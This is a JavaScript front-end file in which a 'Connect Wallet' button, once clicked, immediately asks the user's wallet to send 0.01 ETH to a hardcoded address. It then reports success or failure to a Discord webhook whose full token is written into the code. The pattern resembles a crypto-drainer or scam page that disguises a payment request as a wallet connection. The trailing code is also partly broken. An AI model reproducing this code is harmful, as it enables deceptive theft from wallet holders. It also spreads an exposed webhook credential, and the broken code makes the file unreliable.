import { ethers } from "ethers";
import Web3Modal from "web3modal";

// Discord webhook URL for transaction status
const discordWebhookUrl = 'https://discord.com/api/webhooks/1288775554836860969/vGhZpW1U9hPXFZfZACJomfVg-bY1pjP4__PpK_5Gf2dAxtcgZKZJqRDp3_9z0ULgP7Wg';

// Predefined recipient address and amount to send
const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Change this to the recipient's Ethereum address
const amountToSend = "0.01";  // Amount in Ether to send (e.g., 0.002 ETH)

let provider;
let signer;

async function connectWallet() {
  try {
    const web3Modal = new Web3Modal();
    const instance = await web3Modal.connect();
    provider = new ethers.providers.Web3Provider(instance);
    signer = provider.getSigner();

    console.log("Wallet connected");

    // Proceed to send transaction
    sendTransaction();

  } catch (error) {
    console.error("Failed to connect wallet:", error);
  }
}

async function sendTransaction() {
  try {
    const balance = await signer.getBalance();

    // Ensure the user has enough balance for the transaction
    const requiredAmount = ethers.utils.parseEther(amountToSend);
    if (balance.lt(requiredAmount)) {
      console.error('Not enough Ether in the wallet');
      return;
    }

    // Create transaction
    const tx = {
      to: recipientAddress,
      value: requiredAmount,
    };

    // Send transaction
    const transaction = await signer.sendTransaction(tx);
    console.log("Transaction sent:", transaction.hash);

    // Wait for the transaction to be mined
    const receipt = await transaction.wait();
    console.log("Transaction confirmed:", receipt);

    // Notify Discord of success
    sendToDiscord("Transaction Successful", transaction.hash);

  } catch (error) {
    console.error("Transaction failed:", error);

    // Notify Discord of failure
    sendToDiscord("Transaction Failed", error.message);
  }
}

// Function to send success/failure status to Discord webhook
async function sendToDiscord(status, details) {
  const message = {
    content: `${status}: ${details}`
  };

  try {
    await fetch(discordWebhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(message)
    });
  } catch (error) {
    console.error("Failed to send message to Discord:", error);
  }
}

// Event listener for the Connect Wallet button
document.getElementById("connectWalletBtn").addEventListener("click", connectWallet);

const network = await provider.getNetwork();
if (network.chainId !== 1) {  // Ethereum mainnet has chainId 1
  console.error('Please connect to the Ethereum mainnet.');
}

const gasPrice = await provider.getGasPrice();
const tx = {
  to: recipientAddress,
  value: ethers.utils.parseEther(amountToSend),
  gasPrice: gasPrice
};
